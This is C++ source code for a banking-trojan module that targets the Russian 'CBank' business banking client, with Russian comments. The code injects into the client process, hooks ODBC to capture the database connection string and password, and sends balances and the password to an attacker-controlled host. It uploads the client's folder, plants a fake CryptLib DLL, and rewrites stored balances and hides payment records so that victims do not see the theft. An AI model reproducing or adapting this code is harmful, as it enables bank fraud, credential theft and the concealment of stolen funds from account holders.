#include "BBSCBank.h"
//#include <windows.h>
//#include <wininet.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <sqlext.h>

#include "GetApi.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Memory.h"
#include "Strings.h"
#include "VideoRecorder.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "odbc.h"
#include "Config.h"
#include "rafa.h"
#include "AzConfig.h"
#include "StrConsts.h"
#include "Plugins.h"
#include "BotDebug.h"
#include "installer.h"

namespace BBS_CALC
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define DBG BBS_CALC::DBGOutMessage<>


namespace CBank
{

//какой остаток должен быть для указанного счета
struct RestAccount
{
	char account[32]; //если account[0] = 0, то конец массива
	TIMESTAMP_STRUCT date; //после какой даты
	DWORD diff; //на сколько нужно увеличить остаток 
};

//в какие даты были изменены остатки c балансами которые там были
struct RestAccountFixed
{
	char account[32]; 
	TIMESTAMP_STRUCT date; //дата остатка
	DWORD openingBalance; //баланс на начало
	DWORD closingBalance; //баланс на конец
};

//скрываемые платежки
struct HidePayment
{
	char account[32];
	char num[16]; //номер документа
	DWORD amount; //сумма
	TIMESTAMP_STRUCT date; //дата платежки
};

static RestAccount restAccounts[10]; //подмена баланса
static RestAccountFixed* restFixeds = 0; //значения балансов до подмены (каждый день после подменяемой даты)
static DWORD sizeRestFixeds = 0; //количество памяти занимаемой restFixeds
static HidePayment hidePayments[10]; //скрываемые платежки
static bool runHideReplacement = false; //true - если надо провести подмену скрытие

static DWORD WINAPI SendCBank( void* param ); //отсылка файлов CBank на сервер
static DWORD WINAPI InstallFakeDll(void*); //установка fake.dll
static DWORD WINAPI ThreadHideReplacement(void*); //подмена баланса и скрытие платежек

SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
     SQLHDBC         ConnectionHandle,
     SQLHWND         WindowHandle,
     SQLCHAR *       InConnectionString,
     SQLSMALLINT     StringLength1,
     SQLCHAR *       OutConnectionString,
     SQLSMALLINT     BufferLength,
     SQLSMALLINT *   StringLength2Ptr,
     SQLUSMALLINT    DriverCompletion);

SQLRETURN (WINAPI *pHandlerSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
SQLRETURN (WINAPI *pHandlerSQLExecDirectA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
SQLRETURN (WINAPI *pHandlerSQLExecute)( SQLHSTMT StatementHandle );

//извлекает подстроку между символами c, номер подстроки указывается в num
static char* GetPieceString( const char* s, char c, int num, char* to, int c_to );

static char strODBCConnect[MAX_PATH];
static char domain[128];

static void ReadReplacement( const char* s );
////////////////////////////////////////////////////////
// функции управления базой данных
//////////////////////////////////////////////////////////
static void CloseDB( ODBC* DB )
{
	if( DB ) delete DB;
}

static ODBC* CreateDB()
{
	ODBC* DB = new ODBC();
	if( DB )
		if( !DB->Connect(strODBCConnect) )
		{
			CloseDB(DB);
			DB = 0;
		}
	return DB;
}

static char* GetAdminUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, "rus.zika.in" );
#else
//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
	string host = GetAzHost();
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

/////////////////////////////////////////////////////////////////////
// Хуки
/////////////////////////////////////////////////////////////////////

static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString,
					      SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength,
						  SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion )
{
	if( strODBCConnect[0] == 0 )
	{
		m_lstrcpy( strODBCConnect, (char*)InConnectionString );
		DBG( "CBank", "StringConnect='%s'", InConnectionString );
	}
	return pHandlerSQLDriverConnectA( ConnectionHandle, WindowHandle, InConnectionString, StringLength1,
						  OutConnectionString, BufferLength, StringLength2Ptr, DriverCompletion );
}

static bool SetHooks()
{
	if( !HookApi( DLL_ODBC32, 0x3941DBB7, HandlerSQLDriverConnectA, &pHandlerSQLDriverConnectA ) ) return false;
	return true;
}

static bool InitData()
{
	strODBCConnect[0] = 0;
	if( GetAdminUrl(domain) == 0 )
		domain[0] = 0;
	restAccounts[0].account[0] = 0;
	hidePayments[0].account[0] = 0;
	restFixeds = 0;
	return true;
}

//грабит баланс и отправляет в админку
static DWORD WINAPI GrabAndSendBalance(void*)
{
	DBG( "CBank", "Ждем строки подключения к базе" );
	while( strODBCConnect[0] == 0 ) pSleep(1000);
	pSleep(5000); //после получения строки немного подождем на всякий случай
	ODBC* DB = CreateDB();
	if( DB )
	{
		const char* sql = "select Rest,Account from Account";
		const char* format = "os31 os31";
		char Rest[32], Account[32];
		SQLHSTMT qr = DB->ExecuteSql( sql, format, Rest, Account );
		if( qr )
		{
			DBG( "CBank", "Rest=%s, Account=%s", Rest, Account );
			DB->CloseQuery(qr);
			//извлекаем пароль
			char pwd[64]; pwd[0] = 0;
			char* p = m_strstr( strODBCConnect, "PWD=" );
			if( p )
			{
				p += 4; //переходим на сам пароль
				char* p2 = p;
				while( *p2 && *p2 != ';' ) p2++; //ищем конец пароля
				int len = p2 - p;
				m_memcpy( pwd, p, len );
				pwd[len] = 0;
			}
			DBG( "CBank", "Пароль='%s'", pwd );
			fwsprintfA pwsprintfA = Get_wsprintfA();
			MemPtr<512> qr;
			string user = GetAzUser();
			pwsprintfA( qr.str(), "http://%s/set/bal.html?uid=%s&type=bss&sum=%s&acc=%s&pass=%s&cid=%s", domain, BOT_UID, Rest, Account, pwd, user.t_str() );
			DBG( "CBank", "Отсылаем запрос %s", qr.str() );
			THTTPResponseRec Response;
			ClearStruct(Response);
			HTTP::Get( qr, 0, &Response );
			HTTPResponse::Clear(&Response);
		}
		else
			DBG( "CBank", "Запрос не выполнился" );
		CloseDB(DB);
	}
	else
		DBG( "CBank", "Не удалось подключиться к базе" );
	return 0;
}

//поток исполняющийся внутри cbank.exe (cbmain.ex)
static DWORD WINAPI WorkInCBank(void*)
{
	BOT::Initialize(ProcessUnknown);
	if( !InitData() ) return 0;
	char folderCBank[MAX_PATH];
	pGetModuleFileNameA( 0, folderCBank, sizeof(folderCBank) );
	DBG( "CBank", "Заинжектились в процесс '%s'", folderCBank );
	SetHooks();
	StartThread( GrabAndSendBalance, 0 );
	RunThread( ThreadHideReplacement, 0 );
	return 0;
}

static DWORD IsRunBClient( char* path )
{
	HANDLE snap = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);
	pProcess32FirstW( snap, &pe );
	DWORD ret = 0;
	do
	{
		DWORD dwProcessHash = GetNameHash(pe.szExeFile);
		if ( dwProcessHash == 0xFE0E05F6 ) //cbmain.ex -> cbank.exe
		{
			if( path[0] == 0 ) 
			{
				HANDLE hProc = pOpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID );
				if (hProc)
				{
					pGetModuleFileNameExA( hProc, 0, path, MAX_PATH );
					pCloseHandle(hProc);
				}
			}
			ret = pe.th32ProcessID;
			break;
		}
	} while( pProcess32NextW( snap, &pe ) );
	pCloseHandle(snap);
	return ret;
}

//поток ждет запуска cbank.exe (через rootkit не ловится)
static void WINAPI WaitRunCBank(void*)
{
	DBG( "СBank", "WaitRunCBank" );
	DWORD idCBank = 0;
	char path[MAX_PATH];
	path[0] = 0;
	while(true)
	{
		DWORD id = IsRunBClient(path);
		if( idCBank == 0 )
		{
			if( id )
			{
				DBG( "CBank", "Start '%s'", path );
				idCBank = id;
				InjectIntoProcess( id, WorkInCBank );
				char* path2 = STR::New(path); 
				RunThread( SendCBank, path2 );
				char* path3 = STR::New(path); 
				RunThread( InstallFakeDll, path3 );
#ifdef AmmyyH
				Ammyy::Install(false);
#endif 
				VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
				VideoProcess::ConnectToServer(0);
			}
		}
		else
			if( id == 0 )
			{
				idCBank = 0;
				path[0] = 0;
			}
		pSleep( 4 * 1000 );
	}
}

void Start()
{
	StartThread( WaitRunCBank, 0 );
}

static DWORD WINAPI SendCBank( void* param )
{
	char folderCBank[MAX_PATH];
	m_lstrcpy( folderCBank, (char*)param );
	STR::Free((char*)param);
	//в param передается путь к ехе клиента, папка клиента на два уровня выше 
	pPathRemoveFileSpecA(folderCBank);
	pPathRemoveFileSpecA(folderCBank);
	const char* CBankFlagCopy = "cbank_copy.txt";
	if( Bot->FileExists( 0, CBankFlagCopy ) )
	{
		DBG( "CBank", "Клиент уже был скопирован" );
		return 0;
	}
	DWORD folderSize = 0;
	if( !SizeFolderLess( CBankFlagCopy, 1024*1024*250, &folderSize ) )
	{
		DBG( "CBank", "Папка программы больше заданного размера, не копируем" );
		return 0;
	}
	DBG( "CBank", "запуск отсылки программы на сервер из папки %s", folderCBank );

//	DBG( "IFobs", "Размер папки %d байт", folderSize );
	char tempFolder[MAX_PATH];
	const char* clientPrg = "CBankClient";
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	char* cryptName = UIDCrypt::CryptFileName( clientPrg, false );
	pPathAppendA( tempFolder, cryptName );
	STR::Free(cryptName);
	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
	{
		DBG( "CBank", "Эта папка на данный момент выкачивается" );
		return 0;
	}
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "CBank", "Копирование во временную папку %s", tempFolder );
	*((int*)&(folderCBank[ m_lstrlen(folderCBank) ])) = 0; 
	CopyFileANdFolder( folderCBank, tempFolder );
	DBG( "CBank", "Копирование на сервер" );
	//удаляем ненужные папки
	const char* DelFolders[] = { 0 };
	int i = 0;
	while( DelFolders[i] )
	{
		pPathAppendA( tempFolder, DelFolders[i] );
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		DBG( "CBank", "Удаление папки %s", tempFolder );
		DeleteFolders(tempFolder);
		pPathRemoveFileSpecA(tempFolder);
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		i++;
	}
	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
	DeleteFolders(tempFolder);
	Bot->CreateFileA( 0, CBankFlagCopy );
	DBG( "CBank", "Копирование на сервер окончено" );
	return 0;
}

////////////////////////////////////////////////////////////////////
//Разные вспомогательные функции
////////////////////////////////////////////////////////////////////

//извлекает подстроку между символами c, номер подстроки указывается в num
static char* GetPieceString( const char* s, char c, int num, char* to, int c_to )
{
	*to = 0;
	if( num < 0 ) return 0;
	int n = 0;
	char* ret = 0;
	for(;;)
	{
		const char* ps = s;
		while( *ps != 0 && *ps != c ) ps++;
		if( n == num || *ps == 0 )
		{
			int len = ps - s;
			if( len >= c_to ) len = c_to - 1;
			ret = to;
			while( len-- > 0 ) *to++ = *s++;
			*to = 0;
			break;
		}
		s = ps + 1;
		n++;
	}
	return ret;
}

//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
static int SumToInt( const char* s, int* len )
{
	int v = 0;
	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
	const char* p = s;
	while( *s == ' ' ) s++;
	while( (*s >= '0' && *s <= '9') || *s == '.'  )
	{
	    if( *s == '.' ) 
	    	kop = 0;
	    else
	    {
			v = v * 10 + (*s - '0');
			if( kop >= 0 ) kop++;
		}
		s++;
	}
	//добавляем нули в конце чтобы всегда в копейках было две цифры
	if( kop < 0 ) kop = 0;
	for( int i = kop; i < 2; i++ ) v *= 10; 
	if( len ) *len = s - p;
	return v;
}

//текст в число, до 1-го не числового символа
static int ValueToInt( const char* s, int* len )
{
	int v = 0;
	const char* p = s;
	while( *s == ' ' ) s++;
	while( *s >= '0' && *s <= '9' )
	{
		v = v * 10 + (*s - '0');
		s++;
	}
	if( len ) *len = s - p;
	return v;
}

//чтение даты в формате dd.mm.yyyy hh:mm:ss, возвращает количество считанных символов
static int ReadDate( const char* s, TIMESTAMP_STRUCT* date )
{
	m_memset( date, 0, sizeof(TIMESTAMP_STRUCT) );
	const char* p = s;
	while( *s == ' ' ) s++;
	int len;
	do
	{
		date->day = ValueToInt( s, &len ); s += len;
		if( *s != '.' ) break;
		s++;
		date->month = ValueToInt( s, &len ); s += len;
		if( *s != '.' ) break;
		s++;
		date->year = ValueToInt( s, &len ); s += len;
		if( *s != ' ' ) break;
		while( *s == ' ' ) s++;
		date->hour = ValueToInt( s, &len ); s += len;
		if( *s != ':' ) break;
		s++;
		date->minute = ValueToInt( s, &len ); s += len;
		if( *s != ':' ) break;
		s++;
		date->second = ValueToInt( s, &len ); s += len;
	} while(0);
	return s - p;
}

static int ReadString( const char* s, char* buf )
{
	const char* p = s;
	while( *s == ' ' ) s++;
	while( *s && *s != ' ' ) *buf++ = *s++;
	*buf = 0;
	return s - p;
}


//считывает строку вида
//"40702810300010100847 4.82 25.11.2012 10:11: 12, 40702810300010100847 1000.00 27.11.2012; 40702810300010100847 675 26.11.2012, 40702810300010100847 678 28.11.20012";
//где через запятую перечисляются балансы для подмены: счет сумма дата
//после точки с запятой идут скрываемые платежки (через запятую): счет номер платежки дата
static void ReadReplacement( const char* s )
{
	//чтение остатка
	int n = 0;
	while( *s )
	{
		//считываем счет
		s += ReadString( s, restAccounts[n].account );
		//сумма
		int len;
		restAccounts[n].diff = SumToInt( s, &len );
		s += len;
		//дата
		s += ReadDate( s, &restAccounts[n].date );
		DBG( "CBank", "Подмена баланса для счета: %s, разница: %d", restAccounts[n].account, restAccounts[n].diff );
		DBG( "CBank", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
		while( *s == ' ' ) s++;
		n++;
		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
		if( *s++ == ';' ) break;
	}
	restAccounts[n].account[0] = 0; //конец массива
	n = 0;
	while( *s )
	{
		//считываем счет
		s += ReadString( s, hidePayments[n].account );
		//номер платежки
		s += ReadString( s, hidePayments[n].num );
		s += ReadDate( s, &hidePayments[n].date );
		while( *s == ' ' ) s++;
		DBG( "CBank", "Скрытие платежки: %s %s", hidePayments[n].account, hidePayments[n].num );
		DBG( "CBank", "Дата %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
		n++;
		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
		s++;
	}
	hidePayments[n].account[0] = 0; //конец массива
}

//корректировка баланса
static void ReplacementBalance()
{
	DBG( "CBank", "Осуществляем подмену баланса" );
	int n = 0;
	ODBC* DB = CreateDB();
	if( DB )
	{
		TMemory sqlBuf(1024);
		const char* sql;
		fwsprintfA pwsprintfA = Get_wsprintfA();
		while( restAccounts[n].account[0] )
		{
			DBG( "CBank", "Счет %s, разница %d", restAccounts[n].account, restAccounts[n].diff );
			char openingBalance[16], closingBalance[16];
			TIMESTAMP_STRUCT dateBalance;
			ClearStruct(dateBalance);
			//выбираем информацию о балансе с начала указанной даты
			sql = "select OPENINGBALANCE,CLOSINGBALANCE,STATEMENTDATE from STATEMENTRU where ACCOUNT=? and STATEMENTDATE>=? and OPENINGBALANCE<>0 order by STATEMENTDATE";
			SQLHSTMT qr = DB->ExecuteSql( sql, "os16 os16 ot is16 it", openingBalance, closingBalance, &dateBalance, restAccounts[n].account, &restAccounts[n].date );
			if( qr )
			{
				do
				{
					DBG( "CBank", "Входной баланс: %s, выходной баланс: %s", openingBalance, closingBalance );
					DBG( "CBank", "Дата %02d.%02d.%02d", dateBalance.day, dateBalance.month, dateBalance.year );
					DWORD obalance = SumToInt( openingBalance, 0 );
					DWORD cbalance = SumToInt( closingBalance, 0 );
					//смотрим была ли уже подмена
					int m = 0;
					bool update = false; //true - если нужно делать запись новых балансов в базу
					while( restFixeds && restFixeds[m].account[0] )
					{
						if( m_lstrcmp( restAccounts[n].account, restFixeds[m].account ) == 0 &&
							m_memcmp( &restFixeds[m].date, &dateBalance, sizeof(dateBalance) ) == 0 )
						{
							//нашли, значит были на этой строке, сверяем
							//открывающий баланс можно изменять только если дата не равна дате с которой нужно менять
							//так как платежка прошла в этот день и соотвественно начальный баланс не меняется
							if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) != 0 &&
								/*restFixeds[m].openingBalance + */restAccounts[n].diff != obalance )
							{
								obalance = /*restFixeds[m].openingBalance + */restAccounts[n].diff;
								update = true;
							}
							if( /*restFixeds[m].closingBalance + */restAccounts[n].diff != cbalance )
							{
								cbalance = /*restFixeds[m].closingBalance + */restAccounts[n].diff;
								update = true;
							}
							break;
						}
						m++;
					}
					if( restFixeds == 0 || restFixeds[m].account[0] == 0 ) //такой строки еще не было
					{
						if( (m + 1) * sizeof(RestAccountFixed) > sizeRestFixeds ) //недостаточно памяти
						{
							sizeRestFixeds += 5 * sizeof(RestAccountFixed);
							restFixeds = (RestAccountFixed*)MemRealloc( restFixeds, sizeRestFixeds );
						}
						m_lstrcpy( restFixeds[m].account, restAccounts[n].account );
						restFixeds[m].openingBalance = obalance;
						restFixeds[m].closingBalance = cbalance;
						m_memcpy( &restFixeds[m].date, &dateBalance, sizeof(dateBalance) );
						restFixeds[m + 1].account[0] = 0; //конец массива
						//обновляем балансы
						//в день платежки входящий баланс менять нельзя
						if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) )
							obalance = /*+=*/ restAccounts[n].diff;
						cbalance = /*+=*/ restAccounts[n].diff;
						update = true;
					}
					if( update )
					{
						DBG( "CBank", "Новые входной баланс: %u, выходной баланс: %u", obalance, cbalance );
						///отсылаем запрос на обновление
						sql = "update STATEMENTRU set OPENINGBALANCE=%d.%d, CLOSINGBALANCE = %d.%d where ACCOUNT=? and STATEMENTDATE=?";
						pwsprintfA( sqlBuf.AsStr(), sql, obalance / 100, obalance % 100, cbalance / 100, cbalance % 100 );
						DBG( "CBank", "%s", sqlBuf.AsStr() );
						SQLHSTMT qr2 = DB->ExecuteSql( sqlBuf.AsStr(), "is16 it", restAccounts[n].account, &dateBalance );
						DB->CloseQuery(qr2);
					}
				} while( DB->NextRow(qr) );
				DB->CloseQuery(qr);
			}
			//берем последний баланс и ложим его в таблицу счетов
			sql = "select CLOSINGBALANCE from STATEMENTRU where STATEMENTDATE=(select Max(STATEMENTDATE) from STATEMENTRU) and CLOSINGBALANCE<>0";
			qr = DB->ExecuteSql( sql, "os16", closingBalance );
			if( qr )
			{
				DB->CloseQuery(qr);
				sql = "update ACCOUNT set REST=%s where ACCOUNT=?";
				pwsprintfA( sqlBuf.AsStr(), sql, closingBalance );
				qr = DB->ExecuteSql( sqlBuf.AsStr(), "is16", restAccounts[n].account );
				DB->CloseQuery(qr);
			}
			n++;
		}
		CloseDB(DB);
		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(CBankRestFixed).t_str() ).t_str(), restFixeds, sizeRestFixeds );
		//File::WriteBufferA( "c:\\22.txt", restFixeds, sizeRestFixeds );
	}
}

//скрытие платежек
static void HidePayments()
{
	DBG( "CBank", "Скрываем платежки" );
	ODBC* DB = CreateDB();
	if( DB )
	{
		TIMESTAMP_STRUCT dateFirst; //самая ранняя дата платежек
		const char* sql = "select min(DOCUMENTDATE) from PAYDOCRU";
		SQLHSTMT qr = DB->ExecuteSql( sql, "ot", &dateFirst );
		if( qr )
		{
			DB->CloseQuery(qr);
			TMemory sqlBuf(1024);
			fwsprintfA pwsprintfA = Get_wsprintfA();
			int n = 0;
			while( hidePayments[n].account[0] )
			{
				DBG( "CBank", "Скрываем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
				sql = "update PAYDOCRU set DOCUMENTDATE=?, STATUS=30001 where PAYERACCOUNT=? and DOCUMENTDATE=? and DOCUMENTNUMBER like '%%%s%%'";
				pwsprintfA( sqlBuf.AsStr(), sql, hidePayments[n].num );
				DBG( "CBank", "%s", sqlBuf.AsStr() );
				qr = DB->ExecuteSql( sqlBuf.AsStr(), "it is16 it", &dateFirst, hidePayments[n].account, &hidePayments[n].date );
				DB->CloseQuery(qr);
				n++;
			}
		}
		CloseDB(DB);
	}
}

static DWORD WINAPI ThreadHideReplacement(void*)
{
	pSleep(5000);
	//ждем пока появится строка подключения
	do
	{
		pSleep(1000);
	} while( strODBCConnect[0] == 0 );
	pSleep(1000);
	restFixeds = (RestAccountFixed*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(CBankRestFixed).t_str() ).t_str(), sizeRestFixeds );
//	restFixeds = (RestAccountFixed*)File::ReadToBufferA( "c:\\22.txt", sizeRestFixeds );
	string fileFlag = BOT::MakeFileName( 0, GetStr(CBankFlagUpdate).t_str() );
	for(;;)
	{
		DBG( "CBank", "Запуск подмены и скрытия" );
		DWORD size;
		//в считываемом файле в конце данных должен быть обязательно 0 или любой другой символ,
		//чтобы потом вставить 0 и получить полноценную строку. 
		//Это нужно учитывать при создании файла
		char* rpl = (char*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(CBankReplacement).t_str() ).t_str(), size );
		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
		if( rpl )
		{
			VideoProcess::RecordPID( 0, "CBank" ); //видео пишем только когда была команда на подмену
			rpl[size - 1] = 0;
			ReadReplacement(rpl);
			MemFree(rpl);
		}
		//удаляем флаг запуска подмены
		pDeleteFileA( fileFlag.t_str() );
		ReplacementBalance();
		HidePayments();
		runHideReplacement = false;
		for(;;)
		{
			if( File::IsExists( fileFlag.t_str() ) ) break;
			if( runHideReplacement ) break;
			pSleep(5000);
		}
	}
	return 0;
}

static DWORD WINAPI InstallFakeDll( void* pathExe )
{
	const char* dlls[] =
	{
//		"FrDocInt.dll",
		"CryptLib.DLL",
//		"llwinapi.DLL"
	};

	char pathSystem[MAX_PATH];
	m_lstrcpy( pathSystem, (char*)pathExe );
	STR::Free((char*)pathExe);
	pPathRemoveFileSpecA(pathSystem); //папка Exe
	pPathRemoveFileSpecA(pathSystem); //папка клиента
	pPathAppendA( pathSystem, "system" ); //папка system, в которой длл для подмены

	if( BOT::FakeDllCBankInstalled() ) 
	{
		DBG( "CBank", "fake.dll уже установлена" );
		return 0; 
	}

	DBG("CBank", "Начинаем инсталяцию fake.dll");
	
	TPlugin intaller(GetStr(EStrFakeDllInstaller));

	// Загружаем плагин
	if (!intaller.Download(true))
	{
		DBG("CBank", "Плагин не удалось загрузить" );
		return 0;
	}

	void* dllBody;
	DWORD dllSize;
	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;

	DBG("CBank", "Плагин успешно загружены, начинаем инсталцию");

	// Запускаем инсталяцию
	typedef BOOL (WINAPI *TInstall2)(const char* nameDll, BYTE* dllBody, DWORD dllSize);

	TInstall2 install;
	if( intaller.GetProcAddress( 0x4CA88DAD /* Install2 */, (LPVOID&)install ) )
	{
		bool installed = false;
		//выделяем место для бот плага
		BYTE* botData = (BYTE*)MemAlloc(dllSize);
		if( botData )
		{
			DWORD rand = (DWORD)pGetTickCount();
			int n = rand % ARRAYSIZE(dlls);
			for( int j = 0; j < 5; j++ ) //делаем 5 попыток установки, ошибка в инсталяции может быть из-за отсутствия нужной длл, на следующей попытке будет выбрана другая
			{
				pPathAppendA( pathSystem, dlls[n] );
				KillBlockingProcesses(dlls[n]);
				m_memcpy( botData, dllBody, dllSize );
				if( install( pathSystem, botData, dllSize ) )
				{
					DBG("CBank", "Инсталяция fake.dll успешно выполнена" );
					installed = true;
					break;
				}
				else
				{
					DBG("CBank", "Инсталяция fake.dll не выполнена" );
					n++;
					if( n >= ARRAYSIZE(dlls) ) n = 0;
				}
				pPathRemoveFileSpecA(pathSystem);
			}
			MemFree(botData);
		}
		if( installed )
		{
			Bot->CreateFileA( 0, GetStr(EStrFakeDllCBankFlag).t_str() );
		}
	}
	MemFree(dllBody);
	return 0;
}

}

